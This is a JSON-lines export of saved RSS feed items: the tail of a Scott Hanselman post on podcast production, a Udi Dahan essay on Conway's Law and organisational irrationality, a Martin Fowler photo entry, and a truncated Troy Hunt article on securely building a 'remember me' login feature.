volume.</p><p>I move our tracks around using the phone/Skype track as a guide. It tells me what we're supposed to sound like and gets our conversation in Sync. When I feel we are in sync, I<strong>mute</strong>the Skype track and listen to us talk.</p><p><img title=\"Editing in Audacity\"style=\"display: inline\"alt=\"Editing in Audacity\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_b3a6ce1b-cddb-43a7-92ee-5f251b772376.png\"width=\"600\"height=\"450\"/></p><p>For complex show I'll use Adobe Audition and use the Effects Rack. I use a Speech Volume Leveler and a\"Hard Limiter\" to keep the voices at a strong, but not overpowering level. There are LOTS of great Tutorials online to show you how to use tools like Audacity and Audition.</p><p><img title=\"Editing in Adobe Audition\"style=\"display: inline\"alt=\"Editing in Adobe Audition\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_aee8e9e4-4330-43c1-b913-b4b9ca0f8531.png\"width=\"600\"height=\"544\"/></p><p>It's like PhotoShop for sound! There are layers and filters and effects. Thinking about it this way greatly helped my mental block.</p><h3>Publishing</h3><p>We recommend using<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.libsyn.com\">LibSyn</a>for your hosting and publishing your podcasts. If you are more technical you can certainly use Amazon S3, Azure Blobs or just your own existing host if you like. For shows like Hanselminutes that have almost 30,000 megabytes of shows, we use S3. Both<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.ratchetandthegeek.com\">Ratchet and The Geek</a>and<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.thisdeveloperslife.com\">This Developer's Life</a>use LibSyn.</p><p>LibSyn offers a simple platform for publishing and feed creation. It also has fantastic stats and can even make mobile apps for your shows if you want.</p><p><img title=\"Our Stats\"style=\"display: inline\"alt=\"Our Stats\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_fa138376-61f5-4ee4-9b69-c2e27ea21369.png\"width=\"557\"height=\"312\"/></p><h4>Your Feed</h4><p>Podcast feeds are just like RSS feeds except they also include an\"enclosure\" tag. Services like FeedBurner and<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.feedblitz.com\">FeedBlitz</a>can add this tag for you if your blog doesn't support it directly. While it's unclear how long FeedBurner will last, We use it for its easy podcast creation ability.</p><p><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_13b58288-6134-4396-ba3e-67cc0c71e4e5.png\"width=\"600\"height=\"450\"/></p><p>Make sure you submit your Podcast to iTunes and Windows Phone/Zune. I also suggest telling<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/robgreenlee\">Rob Greenlee</a>(the manager of the Windows Phone/Xbox/Zune podcasts) on Twitter about your show).</p><p><img title=\"Submit from the iTunes app\"style=\"display: inline\"alt=\"Submit from the iTunes app\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_d899abad-d93d-4139-a109-7f223051cade.png\"width=\"500\"height=\"372\"/></p><p>Here are some other podcast directories you should be sure to target:</p><ul><li><strong>BlackBerry -</strong>You can submit your podcast by going to the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~rimpodcast.quickplay.ca/rimpodcasting/login.seam\"><strong>Podcast submission page</strong></a>and creating a RIM podcast account.</li><li><strong>Stitcher</strong><br><strong>Stitcher -</strong>is a radio-like service that allows you to submit your audio podcast to. Submit your audio only podcast at the<strong><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~stitcher.com/contentProviders.php\">Content Partner page</a></strong>.</li><li><strong>Tunein Radio -</strong>You can submit your Podcast to Tunein by sending an email to<a href=\"mailto:broadcaster-support@tunein.com\"><strong>Broadcast Support</strong></a>.</li><li><strong>DoubleTwist -</strong>Submit your show by<strong><a href=\"mailto:support@doubletwist.com\">emailing Support</a></strong>with your show's name, RSS, and description.</li></ul><h3>Conclusion</h3><p>Ultimately you need an MP3 that shows up in a feed and a website to promote it. Everything you can do on top of this will only help you! Think about sound quality, topic quality, consistency, website quality, and technical details.</p><hr /><p><strong>Sponsor:</strong>Big thanks to CodeProject for sponsoring the feed this week! What you can do with 215+ million business records? Dig into the data in the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/11ZEAS7\">D&B Developer Challenge and post an article on CodeProject about what you could do with the data</a>. Over $40,000 in prizes total are up for grabs.<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/11ZEAS7\">Check it out</a>!</p><br><hr/>©2013 Scott Hanselman. All rights reserved.<br></div><Img align=\"left\"border=\"0\"height=\"1\"width=\"1\"style=\"border:0;float:left;margin:0;padding:0\"hspace=\"0\"src=\"http://feeds.hanselman.com/~/i/42683094/0/scotthanselman\"><div style=\"clear:both;padding-top:0.2em;\"><a title=\"Like on Facebook\"href=\"http://feeds.hanselman.com/_/28/42683094/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/fblike20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Share on Google+\"href=\"http://feeds.hanselman.com/_/30/42683094/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/googleplus20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Tweet This\"href=\"http://feeds.hanselman.com/_/24/42683094/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/twitter20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by email\"href=\"http://feeds.hanselman.com/_/19/42683094/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/email20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by RSS\"href=\"http://feeds.hanselman.com/_/20/42683094/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/rss20.png\"style=\"border:0;margin:0;padding:0;\"></a> </div>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1158}}
{"k":"0000000084","o":"0000008000","v":"001"}
{"_id":1159,"_uid":1159,"_dt":1373742620947,"_s":"f9ee17ba41d97102830a1cf667f9937d"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/r7RJeHsf8vY/","title":"Leveraging irrationality towards success","published":{"$wrap":"$date","v":1348737020000,"h":"2012-09-27T09:10:20.000Z"},"starred":false,"read":false,"content":"<p><img src=\"http://www.udidahan.com/wp-content/uploads/irrational.jpg\" alt=\"irrational\" title=\"irrational\" width=\"200\" height=\"192\" style=\"float:right; margin-left:10px; margin-bottom:10px;\" />We’ve all seen good ideas emerge in the software space – from objects, to components, to services, to domain models, and the *DD approaches. Yet, in most organizations, it is very hard for these ideas to get traction.</p><p>I’ve heard from countless developers and architects over the years about their frustration in getting everybody else to go along with them. “Can’t they see how much better [new approach] is over what we’re doing now?!” they ask, believing that things could and actually would be evaluated on their merits, especially in a rational field like IT.</p><p>The usual explanation I give has a couple of parts.</p><h3>Conway’s Law</h3><p>In 1968 Melvin Conway penned what later became known as <a href=\"http://en.wikipedia.org/wiki/Conway's_law\">Conway’s Law</a> which stated:</p><blockquote><p>“organizations which design systems … are constrained to produce designs which are copies of the communication structures of these organizations.”</p></blockquote><p>An important corollary of that law is that if you wish to have a significant impact on the design of a system, you would need to have a similarly significant impact on the communication structure of the organization making that system.</p><p>The main problem is that the people that tend to be pushing for DDD, IoC, CQRS, SOA, etc are usually not as strong when it comes to the soft skills that are so necessary for bringing about organizational change. The thing is that, at a minimum, these types of changes take 3 to 5 years so it really takes a long-term commitment, both from the individual and the organization.</p><h3>On the rationality of people in IT</h3><p>First of all, people are a whole lot less rational than they’d like to believe – or that they’d like other people to notice. In fact, people will go to great lengths to maintain the appearance of consistency and rationality, even at the cost of harm to themselves. How’s that for irrational?</p><p>Don’t take my word for it – there’s a great book on the topic: <a href=\"http://www.amazon.com/gp/product/0061353248/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=0061353248&linkCode=as2&tag=thesoftwaresi-20\">Predictably Irrational: The Hidden Forces That Shape Our Decisions</a>. The somewhat scary thing about it is that not only are we irrational beings, but that that irrationality can be predicted and, yes, even manipulated.</p><p>Once you can understand that the people you’re trying to convince aren’t Vulcan, you have a much better chance of being effective. I’d say that, for myself, understanding my own modes of irrationality increased my effectiveness as well, and made me quite a bit happier in life too.</p><h3>Why you need to bring in a consultant</h3><p>This isn’t me hawking my wares – believe me, I’m busy enough as it is, but let me know when this starts to sound familiar to you.</p><p>There’s a problem in your organization – could be that you’re not delivering software fast enough, high enough quality, whatever. Suffice it to say that Management isn’t happy. You’ve been living this pain for a while and know exactly what the source of the problem is (more often than not, management has at least a hand if not a whole arm in it). You come up with some recommendations, bring them to the higher-ups, but ultimately are ignored, dismissed, or don’t even get into the room.</p><p>Some time later, management brings in a Consultant (that’s right, with a capital ‘C’) who is there to figure out what’s wrong and come up with recommendations. In some cases, especially in larger organizations, they bring in a whole bunch of them from a brand name like McKinsey or Ernst & Young.</p><p>If these guys are smart, they listen to you, ultimately presenting your analysis and recommendations to management. Of course, those higher-ups are in awe of how quickly these guys were able to understand the inner workings of their organization. That awe lends instant credibility to their recommendations which are then adopted and given powerful political backing.</p><p>And you’re sitting there thinking, “but… but… but that’s what I was saying!!”.</p><p>It’s not the message – it’s the messenger. </p><p>Let me put it another way, explained from the perspective of management – we’re having problems, you work here, ergo you’re part of the problem. Also, you don’t make that much money (compared to management), so how smart could you be? Those brand-name consultants, well, they cost a LOT, so they MUST be good (good enough to know not to work here too).</p><p>Therefore the more the consultant costs, the more likely management is to listen, which ultimately creates the conditions for success, which makes the change happen, which proves to management that they were right to bring in an expensive consultant. A vicious (or virtuous) cycle – depending on how you look at it.</p><p>Now, it doesn’t always work this way, but it does often enough to perpetuate management’s world view.</p><h3>In Closing</h3><p>I do hope your organization and its leaders aren’t trapped in this kind of dysfunction, but if they are, know that you’re not alone and that you can get help – either via consulting or in some books:</p><p>Some good books include <a href=\"http://www.amazon.com/gp/product/1400064287/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=1400064287&linkCode=as2&tag=thesoftwaresi-20\">Made to Stick: Why Some Ideas Survive and Others Die</a> and the grandfather of the field: <a href=\"http://www.amazon.com/gp/product/0671027034/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=0671027034&linkCode=as2&tag=thesoftwaresi-20\">How to Win Friends & Influence People</a>. There are countless others and there isn’t any right place to start – the most important thing to do is to start.</p><p>It’s been over 40 years since Melvin Conway’s observation and, as an industry, we’re still relearning these things – usually through the school of hard knocks. But there is an upside here – I’m pretty sure that, knowing these patterns, you could pick up on some signals during the interviewing process and find a company that’s outgrown many of these issues – one that would be able to have more meritocratic discussions on technical choices.</p><p>In the worst case, you could become a consultant and make a living off of all this irrationality <img src='http://www.udidahan.com/wp-includes/images/smilies/icon_smile.gif' alt=':-)' class='wp-smiley' /> </p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=r7RJeHsf8vY:98R7fznl1zo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=r7RJeHsf8vY:98R7fznl1zo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=r7RJeHsf8vY:98R7fznl1zo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=r7RJeHsf8vY:98R7fznl1zo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=r7RJeHsf8vY:98R7fznl1zo:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/r7RJeHsf8vY\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1159}}
{"k":"0000000084","o":"0000000428","v":"001"}
{"_id":1160,"_uid":1160,"_dt":1373742620947,"_s":"7d3b36b183629cfc92c126b825bead5c"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/photos/45.html","title":"photostream 45","published":{"$wrap":"$date","v":1366845480000,"h":"2013-04-24T23:18:00.000Z"},"starred":false,"read":false,"content":"<p><a href = 'http://martinfowler.com/photos/45.html'><img src = 'http://martinfowler.com/photos/45.jpg'></img></a></p><p></p><p>Segovia, Spain</p>","author":false,"_id":{"$wrap":"$oid","v":1160}}
{"k":"0000000084","o":"0000024857","v":"001"}
{"_id":1161,"_uid":1161,"_dt":1373742620947,"_s":"9c0bd1db4fe1f2ea5f6de6c5d0814ce5"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/8M6Zs6dCWn8/how-to-build-and-how-not-to-build.html","title":"How to build (and how not to build) a secure “remember me” feature","published":{"$wrap":"$date","v":1372669440001,"h":"2013-07-01T09:04:00.001Z"},"starred":false,"read":false,"content":"<p>Here’s the scenario – a user logs in to your website, comes back tomorrow and… has to log in again. The idea of the “remember me” feature – and let’s face it, we’ve all seen this before – is that their authenticated state is persisted beyond the immediate scope of use. What this means is that they can close the browser, turn off the PC then come back tomorrow or next week or next month or however much later you determine is a reasonable timeframe and the site still knows who they are and offers them all the same features they had when they left it.</p><p>I’m talking about this little guy here:</p><p><img width=\"462\" height=\"82\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"\"Keep me logged in\" from Facebook\" src=\"http://lh4.ggpht.com/-JHWNglBmUDo/UdFF-IW2fwI/AAAAAAAAFbs/VFVvfJmNXbo/image31.png?imgmax=800\" border=\"0\"></p><p>Seems easy, right? It can be, but as you’ll see it’s also not uncommon to make an absolute mess of it and even when you do get it right, there’s a queue of people ready to tell you how it is, in fact, not quite right enough. Let’s start with the<em>really</em>wrong stuff and work from there.</p><a name='more'></a><h4>Anti-patterns</h4><p>This seems obvious, right? I mean the implementation of a “remember me” feature is pretty fundamental, not the sort of thing easily gotten wrong, surely? Apparently not.</p><p>Let me share two anti-patterns and we’ll discuss the problems with them before talking about how to do it right. The first example comes courtesy of Black& Decker, that would be the same B&D I recently wrote about in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy</a>. Here’s the idea when you login:</p><p><img width=\"488\" height=\"285\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Black& Decker\" src=\"http://lh5.ggpht.com/-wvgqafGAVEU/UdFF-1kwgAI/AAAAAAAAFb0/r7vYPJJfcM8/image5.png?imgmax=800\" border=\"0\"></p><p>That’s all pretty standard, the interesting bit comes after you log in. Let’s take a look at the cookies:</p><p><img width=\"798\" height=\"332\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Black& Decker cookies\" src=\"http://lh5.ggpht.com/-eP31JfR5TiQ/UdFF_gwV6qI/AAAAAAAAFb8/pcnOHLUp0IM/image2.png?imgmax=800\" border=\"0\"></p><p>This is a fairly impressive set of cookies but it’s the highlighted ones that are genuinely interesting. These cookies won’t get set if you don’t check the “remember me” box so their function is purely to log you back in later on. My email address is pretty clearly in there, but that’s not my password, instead it appears to be some sort of impenetrable fortress of cryptographic… hang on – that’s Base64 encoding! The thing about Base64 encoding is that it’s neatly complemented by Base64<em>de</em>coding which means that you can head off to somewhere like<a href=\"http://www.base64decode.org\">base64decode.org</a>and do this:</p><p><img width=\"514\" height=\"313\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Base 64 decoding the Black& Decker cookie\" src=\"http://lh3.ggpht.com/-aQZzH2NHr6c/UdFGASLoJQI/AAAAAAAAFcE/bxNThlU8CnQ/image8.png?imgmax=800\" border=\"0\"></p><p>Now not everyone uses Base64 as a means of “cryptography” (yes,<a href=\"http://www.troyhunt.com/2013/01/the-problem-with-website-security-is-us.html\">some people do genuinely do this</a>) and indeed it’s a perfectly legitimate means of representing data in an ASCII format, the real story here however is that this is my password sitting there in my browser in plain text. You may wonder – why is this a problem? It’s in your own browser, right? How does an attacker get it?</p><p>I’m going to talk about two very easy ways and the first relates to the earlier link about insecurity being easy. Black& Decker had exposed ELMAH logs and in those logs was every unhandled internal server exception, somewhere north of 50,000 of them at the time I reported it to them. When ELMAH logs an exception it also logs all the request headers which means the<em>cookies</em>are logged. Combine that with the huge number of unhandled exceptions being thrown by the system and now you have a treasure trove of user credentials. Yes, they should have secured their ELMAH log properly to begin with but it’s a good example of how you can be very easily undone by one very simple misconfiguration.</p><p>Here’s another one:</p><p><img width=\"250\" height=\"378\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Aussie Farmers Direct\" src=\"http://lh3.ggpht.com/-0MQkqGmrVW8/UdFGBK_Z0QI/AAAAAAAAFcM/7HqbqOyYEEM/image311.png?imgmax=800\" border=\"0\"></p><p>This is<a href=\"https://orders.aussiefarmers.com.au\">Aussie Farmers Direct</a>and it’s a fairly typical looking log in form. Let’s log in, tell it to “remember me” then take a look at the cookies:</p><p><img width=\"796\" height=\"139\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Aussie Farmers Direct cookies\" src=\"http://lh5.ggpht.com/-5OyfmaliDfc/UdFGB70cl0I/AAAAAAAAFcU/kFUtgoBKXrk/image91.png?imgmax=800\" border=\"0\"></p><p>Oh dear, same deal again but without any Base64 encoding. Actually this one is particularly bad because you can do stuff like this:</p><p><img width=\"476\" height=\"37\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Improperly encoded cookie on Aussie Farmers Direct\" src=\"http://lh5.ggpht.com/-HMSOuv66vcg/UdFGCsHlkYI/AAAAAAAAFcc/0emkrm4pDqQ/image18.png?imgmax=800\" border=\"0\"></p><p>XSS your own JSON cookie? Sure! The other idiosyncrasy is that changing your password doesn’t change the cookie so you come back to the site later on and it tries to log you in with the old one. Oops.</p><p>Aussie Farmers Direct doesn’t have exposed ELMAH logs (being PHP kind of helps with that!) but they do have other risks such as XSS (incidentally, this has been responsibly disclosed and the risk summarily dismissed – multiple times). The other thing about both the sites above is that those cookies holding the passwords aren’t flagged as HttpOnly, you can see this in the second column from the right in the cookie lists. What this means is that client script can access those cookies which means that if you can get a piece of XSS onto the site – just as you can on the Aussie Farmers site – you can steal cookies containing passwords if you can get a customer to load the XSS payload (and there are numerous ways of doing that). The missing HttpOnly attribute is sloppy on behalf of both sites, but the core of the issue is storing passwords in cookies which then makes them vulnerable via other oversights.</p><p>There’s one more fundamentally important reason why both these practices are negligent; they’re protecting customers’ credentials used on other sites. Every time a customer using the “remember me” feature on one of the sites above makes a request, there’s a very good chance they’re sending the username and password to their email, their eBay or their bank across the wire, sometimes in plain text, sometimes accessible via client script, always sitting there unprotected in the browser.<a href=\"http://www.troyhunt.com/2012/07/what-do-sony-and-yahoo-have-in-common.html\">Password reuse is rampant</a>and whilst those damn users should take some bloody responsibility (I’m paraphrasing here!), we – as developers –<em>must</em>acknowledge that we’re protecting far more than just our own site when we handle credentials.</p><p>So that should establish that there is a genuine misunderstanding of how the “remember me” feature<em>should</em>be built, let’s now move onto the good practices.</p><h4>A sample reference implementation</h4><p>One of the mantras you frequently hear in the security world is “Don’t roll your own – use what’s already been proven to be robust”. This is very frequently applied to encryption and authentication schemes but in this case we can extend this to the “remember me” feature in order to start with a good reference implementation before we delve into the details.</p><p>In a new ASP.NET MVC 4 website provisioned with Visual Studio 2012 you get this right out of the box:</p><p><img width=\"352\" height=\"338\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to a sample ASP.NET application\" src=\"http://lh3.ggpht.com/-T6wJXCWtnpQ/UdFGDJgd8iI/AAAAAAAAFck/vaA2S0PkYic/image31%25255B1%25255D.png?imgmax=800\" border=\"0\"></p><p>Other frameworks have other standard modes of implementing this feature but this is an easy one for me to refer to. When we login with the fields as above (i.e. not asking it to remember me), successful authentication results in the following cookie being returned:</p><pre>Set-Cookie:.ASPXAUTH=6891A5EAF17A9C35B51C4ED3C473FBA294187C97B758880F9A56E3D335E2F020B86A85E1D0074BDAB2E1C9DBE590AF67895C0F989BA137E292035A3093A702DEC9D0D8089E1D007089F75A77D1B2A79CAA800E8F62D3D807CBB86779DB52F012; path=/; HttpOnly</pre><p>This is simply an auth cookie and in the stateless world that is HTTP it’s the one little piece of data that ties all the otherwise entirely independent requests from one person together. Each time this unique-to-me cookie is sent, the website knows it’s me and that I’ve already authenticated. We can see it bit more clearly when we look at it in Chrome’s Cookies collection:</p><p><img width=\"794\" height=\"56\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application without the\"remember me\" box checked\" src=\"http://lh3.ggpht.com/-8rKwUf_wQtk/UdFGDifnEmI/AAAAAAAAFcs/HrHn4wNix-s/image6.png?imgmax=800\" border=\"0\"></p><p>Incidentally, the second cookie is an anti-forgery token to prevent CSRF attacks and has nothing to do with our authenticated state. Other than that, there are no other cookies.</p><p>Let’s now log in and ask the site to remember me, here’s the cookie response:</p><pre>Set-Cookie:.ASPXAUTH=3A92DAC7EFF4EE5B2027A13DD8ABEA8254F0A16D8059FCAF60F5533F1B7D99462DDF57320D069A493481978750526DF952D5C9EA0371C84F5CF1BFC0CCA024C2052824D4BA09670A42B85AEC7FFCB4088FC744C6C0A22749F07AF6E65E674A4A; expires=Tue, 02-Jul-2013 00:27:05 GMT; path=/; HttpOnly</pre><p>Aha – you see that?! It becomes clearer when you see it broken down in Chrome:</p><p><img width=\"794\" height=\"55\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application with the\"remember me\" box checked\" src=\"http://lh5.ggpht.com/-BunTDUP-fbA/UdFGELSz1cI/AAAAAAAAFc0/NobvT62lNJA/image9.png?imgmax=800\" border=\"0\"></p><p>We now have a cookie expiration which is 48 hours from now as opposed to having no cookie expiration which means it will be discarded when the browser is closed. Let’s take a closer look at that.</p><h4>Looking at auth cookie expiration</h4><p>This is actually a ridiculously easy security construct and it’s only in light of the earlier examples that I’d even think it worth writing about, but here we are. In this implementation, the “remember me” feature simply boils down to when the auth cookie expires because what you’re really doing here is controlling how long you want someone to stay logged on for, it’s that simple.</p><p>In the example above, ASP.NET defaults to using a session cookie or in other words, a cookie that does not have an explicit expiration date and will therefore forcibly expire when the browser is closed. That’s one approach, another is to explicitly set a short expiration period so that even if the browser is left open the user will be automatically logged out after a period of time. Of course you can also control this behaviour on the server and you can also keep extending the lifetime of an auth cookie if the system is being actively used by the server increasing the expiration date on response.</p><p>Remembering someone can be as simple as keeping that auth cookie alive. How long should it be kept alive for? The example above defaults to two days which is probably a bit short for many legitimate uses of the feature (although it’s easily configurable in ASP.NET), try Facebook though and you’ll get cookies that last for a year. Shorter duration means less risk but more inconvenience, longer duration makes it easier for the user but increases the window of potential attack. Let’s take a look at that risk in more detail.</p><h4>Exploiting long-running authentication state</h4><p>While you are not authenticated, your session can’t be hijacked. I know, insightful stuff! But seriously, take a case like Aussie Farmers Direct above; that cookie will expire in six months and combined with the fact that it’s not flagged as HTTP only and that they have XSS flaws in the site there’s now half a year window where just following a link could cause me to inadvertently hand over my credentials to an attacker. If that period was, say, one month yes, they’d still have some serious flaws in their design but then the window of opportunity for an attacker has just been slashed.</p><p>On the other hand, Black& Decker has a relative short one week expiration period so in their case with the exposed ELMAH logs, yes, there was a series of bad failures on their part but unless someone had logged in with the “remember me” box ticked in the last week<em>and</em>caused an unhandled exception, the credentials wouldn’t be put on public display. Ok, if you’re on the site to begin with there’s a good chance you’re already logged in (at least compared to the Farmers example where you wouldn’t have to consciously go anywhere near the site to lose your password) but you can see how that risk profile changes with the cookie expiration period.</p><p>Of course underlying all this is that the auth cookie needs to be carefully protected; HttpOnly and secure attributes are an absolute must. All your classic hijacking threats remain relevant but then again, however you slice and dice this feature you’re going to end up with a cookie dependency therefore you’re going to need to watch those cookies very, very carefully.</p><p>Ultimately it’s a trade-off that needs to consider factors such as the value to an attacker of the user’s data on the site, the barrier that<em>not</em>being authenticated poses to a returning user and the security profile of the rest of the site. For example, Facebook has some very useful data of a social nature and users expect a low-friction (even<em>no</em>-friction) process when returning, plus they’ve made<em>massive</em>investments in their security profile. Aussie Farmer’s, on the other hand, holds personally identifiable user data plus financial info whilst providing a service that people<em>expect</em>to authenticate to (payment facilities) yet have little understanding of important security concepts. They’re very different risk profiles and they<em>should</em>be very different auth cookie expiration strategies.</p><h4>Strengthening the approach</h4><p>There will be folks who look at the auth cookie approach and roll their eyes in despair. The thing about security is that there’s always a better way depending on the time / money / complexity you’re willing to add and there’s also always someone ready to tell you you’ve got it wrong! Using the auth cookie expiration as a starting point, let’s look at some possible ways of strengthening the approach.</p><p>One argument against long expiration of auth cookies is that they’re effectively keeping the user authenticated and at risk of attacks such as CSRF or clickjacking. Of course the application needs to exhibit other risks in order for an attacker to capitalise on the long lasting cookie but the whole defence in depth argument comes up again. An alternative is to have a dedicated cookie keyed against the user which after validating the authenticity of it with the server, can then initiate a new authenticated session on their return. The original session can then expire quickly, the trick is to re-instate a new one when the user comes back with the dedicated “remember me” cookie and include some additional validation in the process.</p><p>One way of providing additional validation is by including the user’s IP address / user agent / other distinguishing feature in the “remember me” cookie. The rationale is that this offers some defence against hijacking of the cookie. The problem, of course, is that there are legitimate use cases where these change. In the mobile world in particular it’s not uncommon to return to a site with a different IP. Even in the world of physical connections you can’t necessarily rely on the ISP providing a static IP address. As for user agents, with browsers like Chrome and Firefox updating at what seems like every other day, unless you’re a bit selective about<em>what</em>attributes of the user agent string you’re storing and comparing that’s going to be a risky approach. The same defences around using unique user attributes to and add security are often discussed in the context of session and auth cookies and whilst I’m sure there are valid use cases for this (back to banking again), I can’t say I’ve actually seen it in place in any of the sites I’ve tested before. There’s probably a good reason for that…</p><p>A more pragmatic mitigation is to still separate the auth cookie from a dedicated “remember me” cookie and use the latter to re-authenticate the user<em>but impose some restrictions</em>. The reality is that the process of automatically persisting someone’s authenticated state – through whatever means – introduces compromises to the security model. A mitigation would be to require an automatically re-authenticated user to expressly provide their credentials again before viewing certain classes of data or performing certain activities. This is not unheard of even outside the scope of “remember me”, you might see it when performing high-value activities such as a bank transfer. In this case, we’re saying that the authenticated user is at greater risk because there’s more likelihood that they’re not who they say they are (i.e. someone else has sat down at the PC and effectively highjacked a session).</p><p>The other hardening we can apply to this approach is to ensure that the cookie used to remember the user is reset after it has been used. This also means invalidating it on the server side so there needs to be both uniqueness and persistence of the cookie value, for example a nonce persisted in both the database and the cookie. This has the benefit of ensuring that if the cookie<em>is</em>obtained by an attacker it has only has a single use scope – and that’s if the user can’t legitimately use it before them. There’s a good little article<a href=\"http://jaspan.com/improved_persistent_login_cookie_best_practice\">here</a>which talks about some mitigations to this pattern and again, there are use cases where this can be beneficial but you are going to invest additional effort building it and there are cases where it will inconvenience legitimate users (i.e. trying to remember yourself on the same site across multiple PCs).</p><p>The last thing worth mentioning is that the same account management principles that need to be considered for active authenticated sessions are relevant in the “remember me” context. For example, are multiple simultaneously authenticated sessions allowed from the one user? If the user changes their password will it disconnect the other sessions? Can an administrator end the authenticated session? There are all sorts of issues that come up that are<em>really</em>part of the discussion on how authenticated sessions are verified and managed, the discussion here is merely about how to reinstate that.</p><h4>When shouldn’t you allow “remember me”? (and some middle-ground alternatives)</h4><p>Sometimes it simply<em>never</em>makes sense to allow an authenticated user to remain authenticated for long periods of time. Banking, for example, is the stereotypical use case for when you want to force re-authentication as soon as possible as the risks are just too significant to leave unused authenticated browser sessions lying around the place.</p><p>But there is actually some middle ground that can be taken here:</p><p><img width=\"240\" height=\"278\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A\"remember me\" box on the American Express website\" src=\"http://lh4.ggpht.com/-utZn1CP4eZM/UdFGEmoMc9I/AAAAAAAAFc8/Lh20wkoe09Y/image12.png?imgmax=800\" border=\"0\"></p><p>This is not entirely what it looks like – when you come back after an expired session where you asked the site to “Remember Me”, you’ll get this:</p><p><img width=\"241\" height=\"280\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; 